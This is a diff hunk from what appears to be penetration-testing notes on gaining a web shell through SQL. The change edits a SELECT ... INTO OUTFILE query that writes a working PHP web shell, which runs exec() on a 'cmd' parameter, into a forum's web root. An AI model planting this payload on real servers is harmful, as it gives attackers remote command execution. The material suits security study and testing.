@@ -184,7 +184,7 @@ This tutorial show how to obtain webshell using sql command https://null-byte.wo
 Using the following SQL query return an error:
 
 ```sql
-SELECT "<form method='get' action='shell.php'><input type='text' name='cmd'/ autofocus><button type='submit'>submit</button></form><?php $output='';exec($_GET['cmd'], $output);echo(implode('<br>', $output)); ?>"
+SELECT "<form method='get' action='cmd.php'><input type='text' name='cmd'/ autofocus><button type='submit'>submit</button></form><?php $output='';exec($_GET['cmd'], $output);echo(implode('<br>', $output)); ?>"
 INTO OUTFILE "/var/www/forum/cmd.php"
 ```
 
